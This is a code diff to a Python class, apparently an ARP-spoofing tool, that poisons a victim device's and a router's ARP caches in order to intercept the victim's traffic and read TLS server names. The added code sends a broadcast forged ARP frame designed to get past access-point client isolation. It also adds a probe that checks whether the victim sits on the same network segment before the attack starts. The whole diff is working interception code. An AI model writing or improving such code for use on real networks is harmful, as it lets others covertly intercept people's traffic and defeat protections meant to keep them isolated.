@@ -174,6 +174,14 @@ class ElmoDivert:
             hwdst=self.victim_mac, pdst=self.victim_ip
         )
 
+        # Broadcast fallback — some APs with client/band isolation only
+        # drop direct unicast frames between clients while still flooding
+        # broadcast, so this can land where the unicast reply above can't.
+        self._to_victim_broadcast = Ether(dst='FF:FF:FF:FF:FF:FF') / ARP(
+            op=1, psrc=self.gateway_ip, hwsrc=self.my_mac,
+            hwdst='FF:FF:FF:FF:FF:FF', pdst=self.victim_ip
+        )
+
         self._to_router = Ether(dst=self.router_mac) / ARP(
             op=2, psrc=self.victim_ip, hwsrc=self.my_mac,
             hwdst=self.router_mac, pdst=self.gateway_ip
@@ -187,10 +195,45 @@ class ElmoDivert:
         while not self._stop_event.is_set():
             try:
                 sendp(self._to_victim, iface=self.interface, verbose=0)
+                sendp(self._to_victim_broadcast, iface=self.interface, verbose=0)
                 sendp(self._to_router, iface=self.interface, verbose=0)
             except Exception as e:
                 print(f"[ARP spoof error] {e}")
             time.sleep(1.0)
+
+    def is_same_segment(self, timeout: float = 1.5) -> bool:
+        """
+        Pre-flight check: send a direct ARP request for victim_ip and see
+        if a reply actually comes back from victim_mac. If the device is
+        isolated on another band/SSID/VLAN, no reply will arrive — this
+        lets callers fail fast with a clear message instead of silently
+        starting a watcher that will never capture anything.
+        """
+        from scapy.all import srp
+
+        if not self.my_mac:
+            from scapy.all import get_if_hwaddr
+            self.my_mac = get_if_hwaddr(self.interface)
+
+        probe = Ether(dst='FF:FF:FF:FF:FF:FF') / ARP(
+            op=1, hwsrc=self.my_mac, pdst=self.victim_ip
+        )
+
+        try:
+            answered, _ = srp(probe, iface=self.interface, timeout=timeout, verbose=0)
+        except Exception as e:
+            print(f"[is_same_segment] probe failed: {e}")
+            return False
+
+        for _, reply in answered:
+            replying_mac = reply[ARP].hwsrc.upper()
+            if self.victim_mac and replying_mac == self.victim_mac.upper():
+                return True
+            if not self.victim_mac:
+                # No known MAC to compare against — any direct reply is good enough
+                return True
+
+        return False
 
     def _extract_sni(self, payload: bytes) -> str | None:
         try:
